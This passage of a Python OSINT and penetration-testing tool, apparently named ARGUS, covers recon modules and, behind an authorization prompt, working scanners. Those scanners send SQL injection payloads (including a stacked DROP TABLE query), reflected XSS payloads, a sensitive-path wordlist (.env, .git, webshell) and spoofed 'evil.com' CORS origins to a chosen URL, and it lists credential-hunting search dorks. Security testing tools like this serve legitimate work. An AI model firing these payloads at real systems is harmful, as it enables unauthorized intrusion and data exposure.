        (f'site:{target} intext:"password" OR intext:"username"', "Credentials in text"),
        (f'site:{target} ext:php inurl:?', "PHP with parameters"),
        (f'site:{target} inurl:wp-content', "WordPress content"),
        (f'site:{target} inurl:wp-admin', "WordPress admin"),
        (f'"{target}" inurl:pastebin.com', "Pastebin mentions"),
        (f'"{target}" site:github.com', "GitHub mentions"),
        (f'"{target}" site:trello.com', "Trello mentions"),
        (f'site:{target} intext:"@gmail.com" OR intext:"@yahoo.com"', "Email addresses"),
        (f'site:{target} inurl:signup OR inurl:register', "Registration pages"),
        (f'site:{target} -www', "Subdomains (excluding www)"),
    ]

    for i, (dork, desc) in enumerate(dorks, 1):
        print(f"  {C}{i:>3}.{RST} {Y}{desc}{RST}")
        print(f"       {W}{dork}{RST}")
        print()


# ─── 21. Traceroute ──────────────────────────────────────────────────────────

def traceroute():
    print_header("Traceroute")
    host = prompt("Target host (IP or domain)")
    if not host:
        return

    spinner("Resolving host...", 0.5)
    try:
        dest_ip = socket.gethostbyname(host)
        print_row("Target", f"{host} ({dest_ip})")
    except socket.gaierror:
        print_err("Could not resolve hostname")
        return

    print_warn("Running traceroute (max 30 hops, may take a moment)...")
    print()

    port = 33434
    max_hops = 30
    timeout_s = 2

    for ttl in range(1, max_hops + 1):
        recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        recv_sock.settimeout(timeout_s)

        send_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)

        start = time.time()
        send_sock.sendto(b"", (dest_ip, port))

        addr = None
        try:
            _, addr_info = recv_sock.recvfrom(512)
            addr = addr_info[0]
            rtt = (time.time() - start) * 1000
        except socket.timeout:
            rtt = None

        send_sock.close()
        recv_sock.close()

        if addr:
            try:
                hostname = socket.gethostbyaddr(addr)[0]
                print(f"  {C}{ttl:>3}{RST}  {W}{addr:<16}{RST} ({hostname})  {G}{rtt:.1f} ms{RST}")
            except socket.herror:
                print(f"  {C}{ttl:>3}{RST}  {W}{addr:<16}{RST}  {G}{rtt:.1f} ms{RST}")

            if addr == dest_ip:
                print_ok("Destination reached!")
                break
        else:
            print(f"  {C}{ttl:>3}{RST}  {Y}*  *  *  (timeout){RST}")

    port += 1


# ─── 22. Hash Identifier & Lookup ────────────────────────────────────────────

def hash_lookup():
    print_header("Hash Identifier & Lookup")
    hash_val = prompt("Hash value")
    if not hash_val:
        return

    hash_val = hash_val.strip()
    length = len(hash_val)

    # Identify hash type
    hash_types = []
    if re.match(r"^[a-fA-F0-9]+$", hash_val):
        type_map = {
            32: ["MD5", "NTLM"],
            40: ["SHA-1"],
            56: ["SHA-224"],
            64: ["SHA-256"],
            96: ["SHA-384"],
            128: ["SHA-512"],
        }
        hash_types = type_map.get(length, [f"Unknown ({length} hex chars)"])
    elif hash_val.startswith("$2b$") or hash_val.startswith("$2a$"):
        hash_types = ["bcrypt"]
    elif hash_val.startswith("$6$"):
        hash_types = ["SHA-512 (Unix crypt)"]
    elif hash_val.startswith("$5$"):
        hash_types = ["SHA-256 (Unix crypt)"]
    elif hash_val.startswith("$1$"):
        hash_types = ["MD5 (Unix crypt)"]
    else:
        hash_types = ["Unknown format"]

    print_row("Hash", hash_val[:50] + ("..." if len(hash_val) > 50 else ""))
    print_row("Length", str(length))
    print_row("Possible Type(s)", ", ".join(hash_types))

    # Try to look up hash online
    spinner("Searching online databases...", 1.0)
    found = False

    # Try md5decrypt.net/Api
    if length == 32:
        try:
            resp = requests.get(
                f"https://www.nitrxgen.net/md5db/{hash_val}",
                timeout=8,
            )
            if resp.status_code == 200 and resp.text.strip():
                print_ok(f"Plaintext found: {G}{resp.text.strip()}{RST}")
                found = True
        except Exception:
            pass

    if not found:
        print_warn("Hash not found in online databases")
        print_warn("Try: https://crackstation.net/ or https://hashes.com/")


# ─── 23. ASN Lookup ──────────────────────────────────────────────────────────

def asn_lookup():
    print_header("ASN Lookup")
    query = prompt("ASN number or IP (e.g. AS15169 or 8.8.8.8)")
    if not query:
        return

    spinner("Querying ASN info...", 0.8)

    # If it's an IP, look up its ASN first
    if not query.upper().startswith("AS"):
        try:
            resp = requests.get(f"https://api.bgpview.io/ip/{query}", timeout=10)
            data = resp.json().get("data", {})
            prefixes = data.get("prefixes", [])
            if prefixes:
                asn = prefixes[0].get("asn", {}).get("asn")
                print_row("IP", query)
                print_row("Prefix", prefixes[0].get("prefix", "N/A"))
                print_row("ASN", str(asn))
                query = str(asn)
            else:
                print_err("No ASN data found for this IP")
                return
        except Exception as e:
            print_err(f"Error: {e}")
            return
    else:
        query = query.upper().replace("AS", "")

    try:
        resp = requests.get(f"https://api.bgpview.io/asn/{query}", timeout=10)
        data = resp.json().get("data", {})
        print_row("ASN", f"AS{data.get('asn', query)}")
        print_row("Name", data.get("name", "N/A"))
        print_row("Description", data.get("description_short", "N/A"))
        print_row("Country", data.get("country_code", "N/A"))
        print_row("Website", data.get("website", "N/A"))
        print_row("Email", data.get("email_contacts", ["N/A"])[0] if data.get("email_contacts") else "N/A")
        print_row("RIR", data.get("rir_allocation", {}).get("rir_name", "N/A"))
        print_row("Allocated", data.get("rir_allocation", {}).get("date_allocated", "N/A"))

        # Get prefixes
        resp2 = requests.get(f"https://api.bgpview.io/asn/{query}/prefixes", timeout=10)
        prefix_data = resp2.json().get("data", {})
        v4 = prefix_data.get("ipv4_prefixes", [])
        v6 = prefix_data.get("ipv6_prefixes", [])
        print_row("IPv4 Prefixes", str(len(v4)))
        print_row("IPv6 Prefixes", str(len(v6)))
        if v4:
            print(f"\n  {Y}IPv4 Prefixes (first 10):{RST}")
            for p in v4[:10]:
                print(f"    {C}•{RST} {p.get('prefix', 'N/A')} — {p.get('description', '')}")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 24. Website Screenshot ──────────────────────────────────────────────────

def website_screenshot():
    print_header("Website Screenshot")
    url = prompt("URL (e.g. https://example.com)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    spinner("Generating screenshot via API...", 1.5)
    try:
        import urllib.parse
        encoded = urllib.parse.quote(url, safe="")
        screenshot_url = f"https://image.thum.io/get/width/1280/crop/720/{url}"

        print_ok("Screenshot URL generated!")
        print_row("Preview URL", screenshot_url)
        print()

        # Also try to download it
        resp = requests.get(screenshot_url, timeout=20,
                            headers={"User-Agent": "ARGUS OSINT Tool"})
        if resp.status_code == 200 and len(resp.content) > 1000:
            import os
            filename = f"screenshot_{urlparse(url).netloc.replace('.', '_')}.png"
            filepath = os.path.join(os.getcwd(), filename)
            with open(filepath, "wb") as f:
                f.write(resp.content)
            print_ok(f"Screenshot saved: {filepath}")
            print_row("File Size", f"{len(resp.content) / 1024:.1f} KB")
        else:
            print_warn("Could not download screenshot, use the URL above to view")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 25. Reverse Image Search Links ──────────────────────────────────────────

def reverse_image_search():
    print_header("Reverse Image Search")
    url = prompt("Image URL")
    if not url:
        return

    import urllib.parse
    encoded = urllib.parse.quote(url, safe="")

    spinner("Generating search links...", 0.5)
    engines = {
        "Google Images": f"https://lens.google.com/uploadbyurl?url={encoded}",
        "Yandex Images": f"https://yandex.com/images/search?rpt=imageview&url={encoded}",
        "Bing Visual": f"https://www.bing.com/images/search?view=detailv2&iss=sbi&form=SBIVSP&q=imgurl:{encoded}",
        "TinEye": f"https://tineye.com/search?url={encoded}",
    }

    print_warn("Open these URLs in your browser to perform reverse image searches:\n")
    for name, search_url in engines.items():
        print(f"  {C}{name}:{RST}")
        print(f"    {W}{search_url}{RST}")
        print()

    # Check basic image info
    try:
        resp = requests.head(url, timeout=8, allow_redirects=True,
                             headers={"User-Agent": "ARGUS OSINT Tool"})
        print_row("Content-Type", resp.headers.get("Content-Type", "N/A"))
        size = resp.headers.get("Content-Length", "N/A")
        if size != "N/A":
            print_row("File Size", f"{int(size) / 1024:.1f} KB")
        print_row("Server", resp.headers.get("Server", "N/A"))
    except Exception:
        pass


# ─── 26. CVE Search ──────────────────────────────────────────────────────────

def cve_search():
    print_header("CVE Search")
    query = prompt("Search term (e.g. 'apache 2.4' or 'CVE-2021-44228')")
    if not query:
        return

    spinner("Searching CVE databases...", 1.2)

    if query.upper().startswith("CVE-"):
        # Direct CVE lookup
        try:
            resp = requests.get(
                f"https://cveawg.mitre.org/api/cve/{query.upper()}",
                timeout=10,
            )
            if resp.status_code == 200:
                data = resp.json()
                cna = data.get("containers", {}).get("cna", {})

                print_row("CVE ID", data.get("cveMetadata", {}).get("cveId", query))
                print_row("State", data.get("cveMetadata", {}).get("state", "N/A"))
                print_row("Published", data.get("cveMetadata", {}).get("datePublished", "N/A")[:10])

                descriptions = cna.get("descriptions", [])
                if descriptions:
                    desc = descriptions[0].get("value", "N/A")
                    # Wrap long descriptions
                    while desc:
                        print(f"    {W}{desc[:80]}{RST}")
                        desc = desc[80:]

                metrics = cna.get("metrics", [])
                for m in metrics:
                    cvss = m.get("cvssV3_1") or m.get("cvssV3_0") or m.get("cvssV2_0", {})
                    if cvss:
                        print_row("CVSS Score", str(cvss.get("baseScore", "N/A")))
                        print_row("Severity", cvss.get("baseSeverity", "N/A"))

                affected = cna.get("affected", [])
                for a in affected[:5]:
                    print_row("Product", f"{a.get('vendor', '?')} / {a.get('product', '?')}")
            else:
                print_err(f"CVE not found (HTTP {resp.status_code})")
        except Exception as e:
            print_err(f"Error: {e}")
    else:
        # Keyword search via NIST NVD
        try:
            resp = requests.get(
                f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={query}&resultsPerPage=10",
                timeout=15,
                headers={"User-Agent": "ARGUS OSINT Tool"},
            )
            if resp.status_code == 200:
                data = resp.json()
                total = data.get("totalResults", 0)
                print_row("Total Results", str(total))
                print()

                for vuln in data.get("vulnerabilities", []):
                    cve = vuln.get("cve", {})
                    cve_id = cve.get("id", "N/A")
                    desc = cve.get("descriptions", [{}])[0].get("value", "N/A")
                    metrics = cve.get("metrics", {})
                    score = "N/A"
                    for key in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
                        m = metrics.get(key, [])
                        if m:
                            score = str(m[0].get("cvssData", {}).get("baseScore", "N/A"))
                            break

                    print(f"  {R}{cve_id}{RST} (Score: {Y}{score}{RST})")
                    print(f"    {W}{desc[:120]}{RST}")
                    print()
            elif resp.status_code == 403:
                print_warn("NVD API rate limit reached. Try again in a moment.")
            else:
                print_err(f"NVD API error (HTTP {resp.status_code})")
        except Exception as e:
            print_err(f"Error: {e}")


# ─── 27. Paste Search ────────────────────────────────────────────────────────

def paste_search():
    print_header("Paste / Code Search")
    query = prompt("Search term (email, domain, keyword)")
    if not query:
        return

    spinner("Searching paste sites & code repos...", 1.2)

    import urllib.parse
    encoded = urllib.parse.quote(query, safe="")

    print(f"\n  {Y}Search Links (open in browser):{RST}")
    search_links = {
        "GitHub Code": f"https://github.com/search?q={encoded}&type=code",
        "GitHub Commits": f"https://github.com/search?q={encoded}&type=commits",
        "GitLab": f"https://gitlab.com/search?search={encoded}",
        "Grep.app": f"https://grep.app/search?q={encoded}",
        "SearchCode": f"https://searchcode.com/?q={encoded}",
        "Pastebin (Google)": f"https://www.google.com/search?q=site:pastebin.com+{encoded}",
        "Ghostbin (Google)": f"https://www.google.com/search?q=site:ghostbin.com+{encoded}",
    }

    for name, url in search_links.items():
        print(f"\n  {C}{name}:{RST}")
        print(f"    {W}{url}{RST}")

    # Try GitHub search API (no auth needed for basic)
    print(f"\n  {M}── GitHub Code Results ──{RST}")
    try:
        resp = requests.get(
            f"https://api.github.com/search/code?q={encoded}&per_page=5",
            timeout=10,
            headers={"Accept": "application/vnd.github.v3+json"},
        )
        if resp.status_code == 200:
            data = resp.json()
            print_row("Total Results", str(data.get("total_count", 0)))
            for item in data.get("items", [])[:5]:
                repo = item.get("repository", {}).get("full_name", "")
                path = item.get("path", "")
                print(f"    {G}•{RST} {repo}/{path}")
        elif resp.status_code == 422:
            print_warn("GitHub requires authentication for code search")
        else:
            print_warn(f"GitHub search returned {resp.status_code}")
    except Exception:
        print_warn("Could not query GitHub API")


# ─── 28. DNS Zone Transfer Check ─────────────────────────────────────────────

def dns_zone_transfer():
    print_header("DNS Zone Transfer Check (AXFR)")
    domain = prompt("Domain")
    if not domain:
        return

    if not dns:
        print_err("dnspython not installed. Run: pip install dnspython")
        return

    print_warn("This test checks for misconfigured DNS servers.")
    print_warn("Only test domains you have authorization for.")

    spinner("Finding nameservers...", 0.8)
    try:
        ns_records = dns.resolver.resolve(domain, "NS")
        nameservers = [str(ns).rstrip(".") for ns in ns_records]
        print_row("Nameservers", ", ".join(nameservers))
    except Exception as e:
        print_err(f"Could not find nameservers: {e}")
        return

    import dns.zone
    import dns.query

    vulnerable = False
    for ns in nameservers:
        print(f"\n  {M}── Testing {ns} ──{RST}")
        try:
            ns_ip = socket.gethostbyname(ns)
            zone = dns.zone.from_xfr(dns.query.xfr(ns_ip, domain, timeout=5))
            print_err(f"Zone transfer SUCCEEDED on {ns}!")
            vulnerable = True
            names = zone.nodes.keys()
            print_row("Records Found", str(len(names)))
            for name in sorted(names)[:30]:
                print(f"    {R}•{RST} {name}.{domain}")
            if len(names) > 30:
                print(f"    {Y}... and {len(names) - 30} more{RST}")
        except dns.exception.FormError:
            print_ok(f"{ns}: Transfer refused (secure)")
        except Exception as e:
            print_ok(f"{ns}: Transfer failed ({type(e).__name__})")

    if not vulnerable:
        print(f"\n  {G}All nameservers properly refuse zone transfers.{RST}")
    else:
        print(f"\n  {R}VULNERABLE: Zone transfer possible! This is a security issue.{RST}")


# ─── 29. Cipher / SSL Suite Scanner ──────────────────────────────────────────

def ssl_scanner():
    print_header("SSL/TLS Suite Scanner")
    host = prompt("Domain (e.g. example.com)")
    if not host:
        return

    import ssl

    spinner("Testing SSL/TLS protocols...", 1.5)

    protocols = [
        ("TLSv1.3", ssl.PROTOCOL_TLS_CLIENT, ssl.TLSVersion.TLSv1_3),
        ("TLSv1.2", ssl.PROTOCOL_TLS_CLIENT, ssl.TLSVersion.TLSv1_2),
    ]

    for name, proto, min_ver in protocols:
        try:
            ctx = ssl.SSLContext(proto)
            ctx.minimum_version = min_ver
            ctx.maximum_version = min_ver
            ctx.check_hostname = True
            ctx.verify_mode = ssl.CERT_REQUIRED
            ctx.load_default_certs()
            with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
                s.settimeout(5)
                s.connect((host, 443))
                cipher = s.cipher()
                print_ok(f"{name}: Supported — cipher: {cipher[0]} ({cipher[2]} bits)")
        except ssl.SSLError:
            print_warn(f"{name}: Not supported")
        except Exception as e:
            print_err(f"{name}: Error — {e}")

    # Get full cipher list on default connection
    print(f"\n  {Y}Negotiated Cipher Info:{RST}")
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(5)
            s.connect((host, 443))
            cipher = s.cipher()
            print_row("Cipher Suite", cipher[0])
            print_row("Protocol", cipher[1])
            print_row("Key Bits", str(cipher[2]))

            # Certificate chain
            cert = s.getpeercert()
            issuer = dict(x[0] for x in cert.get("issuer", ()))
            print_row("Issuer", issuer.get("organizationName", "N/A"))
            print_row("Cert Valid Until", cert.get("notAfter", "N/A"))

            # Show all shared ciphers
            shared = s.shared_ciphers()
            if shared:
                print(f"\n  {Y}Supported Cipher Suites ({len(shared)}):{RST}")
                for c in shared[:20]:
                    bits_str = f"{c[2]} bits" if c[2] else "N/A"
                    print(f"    {C}•{RST} {c[0]} ({c[1]}, {bits_str})")
                if len(shared) > 20:
                    print(f"    {Y}... and {len(shared) - 20} more{RST}")
    except Exception as e:
        print_err(f"Error: {e}")


# ─── 30. Shodan Host Lookup ──────────────────────────────────────────────────

def shodan_lookup():
    print_header("Shodan Host Lookup")
    ip = prompt("IP address")
    if not ip:
        return

    spinner("Querying Shodan InternetDB...", 1.0)
    # Using the free InternetDB API (no key needed)
    try:
        resp = requests.get(f"https://internetdb.shodan.io/{ip}", timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            print_row("IP", data.get("ip", ip))

            ports = data.get("ports", [])
            if ports:
                print_row("Open Ports", ", ".join(str(p) for p in ports))
            else:
                print_row("Open Ports", "None found")

            cpes = data.get("cpes", [])
            if cpes:
                print(f"\n  {Y}CPEs (Software):{RST}")
                for cpe in cpes:
                    print(f"    {C}•{RST} {cpe}")

            vulns = data.get("vulns", [])
            if vulns:
                print(f"\n  {R}Known Vulnerabilities ({len(vulns)}):{RST}")
                for v in vulns[:20]:
                    print(f"    {R}•{RST} {v}")
                if len(vulns) > 20:
                    print(f"    {Y}... and {len(vulns) - 20} more{RST}")
            else:
                print_ok("No known vulnerabilities")

            hostnames = data.get("hostnames", [])
            if hostnames:
                print_row("Hostnames", ", ".join(hostnames))

            tags = data.get("tags", [])
            if tags:
                print_row("Tags", ", ".join(tags))
        elif resp.status_code == 404:
            print_warn("No Shodan data found for this IP")
        else:
            print_err(f"Shodan API error (HTTP {resp.status_code})")
    except Exception as e:
        print_err(f"Error: {e}")


# ═══════════════════════════════════════════════════════════════════════════════
#                          EXPLOITATION MODULES
# ═══════════════════════════════════════════════════════════════════════════════

EXPLOIT_DISCLAIMER = f"""
  {R}╔══════════════════════════════════════════════════════╗
  ║ {Y}WARNING: AUTHORIZED TESTING ONLY{R}                      ║
  ║ {W}These tools are for authorized penetration testing,{R}   ║
  ║ {W}CTF challenges, and security research ONLY.{R}           ║
  ║ {W}Unauthorized access to systems is ILLEGAL.{R}            ║
  ║ {Y}You are solely responsible for your actions.{R}          ║
  ╚══════════════════════════════════════════════════════╝{RST}
"""


def exploit_disclaimer():
    print(EXPLOIT_DISCLAIMER)
    confirm = input(f"  {Y}Do you have authorization? (yes/no):{RST} ").strip().lower()
    return confirm in ("yes", "y", "si", "s")


# ─── 31. SQL Injection Tester ─────────────────────────────────────────────────

SQL_PAYLOADS = [
    ("' OR '1'='1", "Basic OR bypass"),
    ("' OR '1'='1' --", "OR bypass with comment"),
    ("' OR '1'='1' #", "OR bypass with hash comment"),
    ("\" OR \"1\"=\"1\"", "Double-quote OR bypass"),
    ("1' ORDER BY 1--", "ORDER BY column enumeration"),
    ("1' ORDER BY 10--", "ORDER BY high column"),
    ("1' UNION SELECT NULL--", "UNION single column"),
    ("1' UNION SELECT NULL,NULL--", "UNION two columns"),
    ("1' UNION SELECT NULL,NULL,NULL--", "UNION three columns"),
    ("' AND 1=1--", "AND true condition"),
    ("' AND 1=2--", "AND false condition"),
    ("'; WAITFOR DELAY '0:0:5'--", "Time-based blind (MSSQL)"),
    ("' AND SLEEP(5)--", "Time-based blind (MySQL)"),
    ("' AND pg_sleep(5)--", "Time-based blind (PostgreSQL)"),
    ("1; DROP TABLE test--", "Stacked query test (harmless table)"),
    ("' UNION SELECT version()--", "Version extraction (MySQL/PG)"),
    ("' UNION SELECT @@version--", "Version extraction (MSSQL)"),
    ("admin'--", "Auth bypass admin"),
    ("' OR 1=1 LIMIT 1--", "OR bypass with LIMIT"),
    ("1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "Error-based extraction"),
]


def sqli_tester():
    print_header("SQL Injection Tester")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL with parameter (e.g. http://target.com/page?id=1)")
    if not url:
        return

    parsed = urlparse(url)
    if "=" not in parsed.query:
        print_err("URL must contain a query parameter (e.g. ?id=1)")
        return

    # Find the parameter to inject
    params = parsed.query.split("&")
    print(f"\n  {Y}Parameters found:{RST}")
    for i, p in enumerate(params):
        print(f"    {C}{i+1}.{RST} {p}")

    param_idx = input(f"\n  {Y}Select parameter to test (1-{len(params)}):{RST} ").strip()
    try:
        param_idx = int(param_idx) - 1
        if not (0 <= param_idx < len(params)):
            print_err("Invalid selection")
            return
    except ValueError:
        print_err("Invalid number")
        return

    target_param = params[param_idx]
    param_name = target_param.split("=")[0]

    spinner("Testing SQL injection payloads...", 1.0)

    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS Pentest)"})

    # Get baseline response
    try:
        baseline = session.get(url, timeout=10)
        baseline_len = len(baseline.text)
        baseline_code = baseline.status_code
    except Exception as e:
        print_err(f"Could not reach target: {e}")
        return

    print_row("Baseline Status", str(baseline_code))
    print_row("Baseline Length", str(baseline_len))
    print()

    findings = []
    for payload, description in SQL_PAYLOADS:
        new_params = list(params)
        new_params[param_idx] = f"{param_name}={payload}"
        test_url = f"{base_url}?{'&'.join(new_params)}"

        try:
            start = time.time()
            resp = session.get(test_url, timeout=12)
            elapsed = time.time() - start
            resp_len = len(resp.text)
            diff = abs(resp_len - baseline_len)

            indicators = []
            # Check for significant size change
            if diff > baseline_len * 0.15 and diff > 50:
                indicators.append("SIZE_DIFF")
            # Check for time-based
            if elapsed > 4.5:
                indicators.append("TIME_DELAY")
            # Check for SQL error messages in response
            sql_errors = [
                "sql syntax", "mysql", "sqlite", "postgresql", "ora-",
                "microsoft sql", "unclosed quotation", "syntax error",
                "unterminated string", "pg_query", "sqlstate",
                "warning: mysql", "valid mysql result",
            ]
            body_lower = resp.text.lower()
            for err in sql_errors:
                if err in body_lower:
                    indicators.append("SQL_ERROR")
                    break

            if indicators:
                tag = ",".join(indicators)
                print_err(f"{R}POTENTIAL{RST} [{Y}{tag}{RST}] {description}")
                print(f"       Payload: {W}{payload}{RST}")
                print(f"       Status: {resp.status_code}  Size: {resp_len} (diff: {diff})  Time: {elapsed:.2f}s")
                findings.append((payload, description, tag))
            else:
                print(f"  {C}  CLEAN{RST}  {description}")
        except requests.exceptions.Timeout:
            print_err(f"{R}TIMEOUT{RST} (possible time-based blind) — {description}")
            findings.append((payload, description, "TIMEOUT"))
        except Exception:
            pass

    print(f"\n  {Y}{'═' * 50}{RST}")
    if findings:
        print(f"  {R}Found {len(findings)} potential injection point(s)!{RST}")
        print_warn("Manual verification required — false positives possible")
    else:
        print_ok("No obvious injection points found with basic payloads")


# ─── 32. XSS Scanner ─────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    ('<script>alert("XSS")</script>', "Basic script tag"),
    ("<img src=x onerror=alert(1)>", "IMG onerror"),
    ("<svg onload=alert(1)>", "SVG onload"),
    ("<svg/onload=alert(1)>", "SVG onload no space"),
    ('"><script>alert(1)</script>', "Break out of attribute"),
    ("'><script>alert(1)</script>", "Break single-quote attr"),
    ("<body onload=alert(1)>", "Body onload"),
    ("<input onfocus=alert(1) autofocus>", "Input autofocus"),
    ("<details open ontoggle=alert(1)>", "Details ontoggle"),
    ("<marquee onstart=alert(1)>", "Marquee onstart"),
    ("javascript:alert(1)", "Javascript protocol"),
    ("<iframe src=javascript:alert(1)>", "Iframe javascript"),
    ('"><img src=x onerror=alert(1)>', "Break attr + IMG"),
    ("<script>alert(String.fromCharCode(88,83,83))</script>", "CharCode bypass"),
    ("%3Cscript%3Ealert(1)%3C/script%3E", "URL-encoded script"),
    ("<scr<script>ipt>alert(1)</scr</script>ipt>", "Nested tag bypass"),
    ("{{constructor.constructor('alert(1)')()}}", "Template injection"),
    ("${alert(1)}", "Template literal"),
]


def xss_scanner():
    print_header("XSS Scanner (Reflected)")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL with parameter (e.g. http://target.com/search?q=test)")
    if not url:
        return

    parsed = urlparse(url)
    if "=" not in parsed.query:
        print_err("URL must contain a query parameter")
        return

    params = parsed.query.split("&")
    print(f"\n  {Y}Parameters found:{RST}")
    for i, p in enumerate(params):
        print(f"    {C}{i+1}.{RST} {p}")

    param_idx = input(f"\n  {Y}Select parameter to test (1-{len(params)}):{RST} ").strip()
    try:
        param_idx = int(param_idx) - 1
        if not (0 <= param_idx < len(params)):
            print_err("Invalid selection")
            return
    except ValueError:
        print_err("Invalid number")
        return

    target_param = params[param_idx]
    param_name = target_param.split("=")[0]
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS Pentest)"})

    spinner("Testing XSS payloads...", 1.0)

    findings = []
    for payload, description in XSS_PAYLOADS:
        new_params = list(params)
        new_params[param_idx] = f"{param_name}={payload}"
        test_url = f"{base_url}?{'&'.join(new_params)}"

        try:
            resp = session.get(test_url, timeout=10)
            # Check if payload is reflected in the response
            if payload in resp.text:
                print_err(f"{R}REFLECTED{RST} — {description}")
                print(f"       Payload: {W}{payload}{RST}")
                findings.append((payload, description))
            elif payload.lower() in resp.text.lower():
                print_warn(f"Partially reflected (case change) — {description}")
            else:
                # Check if key parts are reflected (without full tag)
                canary = payload.replace("<", "").replace(">", "")[:15]
                if canary in resp.text and len(canary) > 5:
                    print_warn(f"Filtered but partially reflected — {description}")
                else:
                    print(f"  {C}  CLEAN{RST}  {description}")
        except Exception:
            pass

    print(f"\n  {Y}{'═' * 50}{RST}")
    if findings:
        print(f"  {R}Found {len(findings)} reflected XSS point(s)!{RST}")
        print_warn("Verify in browser — WAF may still block execution")
    else:
        print_ok("No reflected XSS found with basic payloads")
        print_warn("DOM-based and stored XSS require manual testing")


# ─── 33. Directory Bruteforcer ────────────────────────────────────────────────

COMMON_DIRS = [
    "admin", "administrator", "login", "wp-admin", "wp-login.php",
    "dashboard", "cpanel", "phpmyadmin", "adminer", "panel",
    "api", "api/v1", "api/v2", "graphql", "swagger", "docs",
    "backup", "backups", "bak", "old", "temp", "tmp",
    ".git", ".git/HEAD", ".env", ".htaccess", ".htpasswd",
    "config", "config.php", "configuration.php", "wp-config.php.bak",
    "robots.txt", "sitemap.xml", "crossdomain.xml", "security.txt",
    ".well-known/security.txt", "server-status", "server-info",
    "info.php", "phpinfo.php", "test.php", "debug", "trace",
    "cgi-bin", "cgi-bin/test-cgi", "scripts", "console",
    "uploads", "upload", "files", "media", "images", "assets",
    "static", "public", "private", "secret", "hidden",
    "database", "db", "sql", "dump", "data",
    "wp-content", "wp-includes", "wp-json", "xmlrpc.php",
    "vendor", "node_modules", "bower_components",
    "shell", "cmd", "terminal", "webshell",
    "test", "testing", "staging", "dev", "development",
    "log", "logs", "error_log", "access_log", "debug.log",
    ".DS_Store", "Thumbs.db", "web.config", "package.json",
    "composer.json", "Gemfile", "requirements.txt", "Dockerfile",
    ".svn", ".svn/entries", ".hg", "CVS",
    "readme", "README.md", "CHANGELOG", "LICENSE",
    "install", "setup", "init", "register",
    "reset", "forgot", "password", "user", "users",
    "account", "profile", "settings", "preferences",
    "download", "export", "import", "migrate",
    "status", "health", "healthcheck", "ping", "version",
    "metrics", "prometheus", "grafana",
    "jenkins", "travis", "gitlab-ci", "Jenkinsfile",
    "actuator", "actuator/health", "actuator/env",
    "swagger-ui.html", "api-docs", "redoc",
    "elmah.axd", "trace.axd",
]


def dir_bruteforce():
    print_header("Directory / File Bruteforcer")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL (e.g. https://target.com)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    url = url.rstrip("/")

    spinner("Starting directory scan...", 0.5)
    print_row("Target", url)
    print_row("Wordlist Size", str(len(COMMON_DIRS)))
    print()

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS Pentest)"})

    found = []
    interesting = []

    def check_dir(path):
        try:
            test_url = f"{url}/{path}"
            resp = session.get(test_url, timeout=6, allow_redirects=False)
            return path, resp.status_code, len(resp.content), resp.headers.get("Location", "")
        except Exception:
            return path, 0, 0, ""

    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as pool:
        futures = {pool.submit(check_dir, d): d for d in COMMON_DIRS}
        for future in concurrent.futures.as_completed(futures):
            path, code, size, location = future.result()
            if code == 0:
                continue

            if code == 200:
                print_ok(f"{G}200{RST}  /{path:<35} ({size} bytes)")
                found.append((path, code, size))
            elif code in (301, 302, 307, 308):
                loc = f" -> {location}" if location else ""
                print_warn(f"{Y}{code}{RST}  /{path:<35}{loc}")
                found.append((path, code, size))
            elif code == 403:
                print(f"  {R}403{RST}  /{path:<35} (Forbidden)")
                interesting.append((path, code))
            elif code == 401:
                print(f"  {R}401{RST}  /{path:<35} (Auth Required)")
                interesting.append((path, code))
            # Skip 404s silently

    print(f"\n  {Y}{'═' * 50}{RST}")
    print_row("Accessible (2xx)", str(len([f for f in found if 200 <= f[1] < 300])))
    print_row("Redirects (3xx)", str(len([f for f in found if 300 <= f[1] < 400])))
    print_row("Forbidden (403)", str(len([i for i in interesting if i[1] == 403])))
    print_row("Auth Required (401)", str(len([i for i in interesting if i[1] == 401])))


# ─── 34. CORS Misconfiguration Check ─────────────────────────────────────────

def cors_check():
    print_header("CORS Misconfiguration Scanner")
    if not exploit_disclaimer():
        return

    url = prompt("Target URL (e.g. https://target.com/api)")
    if not url:
        return
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    spinner("Testing CORS policies...", 1.0)

    parsed = urlparse(url)
    target_origin = f"{parsed.scheme}://{parsed.netloc}"

    test_origins = [
        ("https://evil.com", "Arbitrary origin"),
        (f"https://{parsed.netloc}.evil.com", "Subdomain prefix"),
        (f"https://evil{parsed.netloc}", "Origin suffix match"),
        ("null", "Null origin"),
        (target_origin, "Same origin (baseline)"),
        (f"http://{parsed.netloc}", "HTTP downgrade"),
        (f"https://sub.{parsed.netloc}", "Subdomain"),
    ]

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (ARGUS Pentest)"})
    vulns = []

    for origin, description in test_origins:
        try:
            resp = session.get(url, timeout=8, headers={"Origin": origin})
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
